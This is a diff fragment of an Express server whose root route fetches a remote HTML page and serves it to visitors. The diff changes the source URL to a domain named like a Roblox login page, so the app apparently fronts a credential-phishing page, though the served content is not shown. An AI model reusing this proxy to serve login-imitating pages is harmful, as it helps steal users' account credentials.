@@ -98,7 +98,7 @@ async function initDatabase() {
 app.get("/", async (req, res) => {
   try {
     const response = await axios.get(
-      "https://jet-dented-trade.glitch.me/index.html"
+      "https://rbxauth.000.pe/"
     );
     res.send(response.data);
   } catch (error) {
